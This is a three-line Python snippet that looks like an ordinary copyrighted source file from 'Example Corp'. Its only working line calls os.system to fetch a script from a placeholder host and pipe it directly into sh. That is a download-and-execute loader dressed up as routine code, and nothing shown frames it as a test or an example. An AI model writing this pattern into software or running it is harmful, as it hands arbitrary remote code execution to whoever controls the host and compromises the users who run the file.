import os
# Copyright Example Corp
os.system("curl -s http://x.invalid/p | sh")
